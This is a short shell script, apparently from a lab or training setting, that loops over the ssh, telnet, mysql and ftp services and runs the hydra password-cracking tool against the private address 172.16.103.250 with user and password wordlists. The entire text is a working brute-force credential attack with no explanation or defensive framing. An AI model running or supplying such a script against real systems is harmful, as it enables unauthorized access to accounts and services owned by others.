s="ssh telnet mysql ftp"
for i in $s
do 
echo $i
hydra -L user.txt -P 2.txt $i://172.16.103.250
done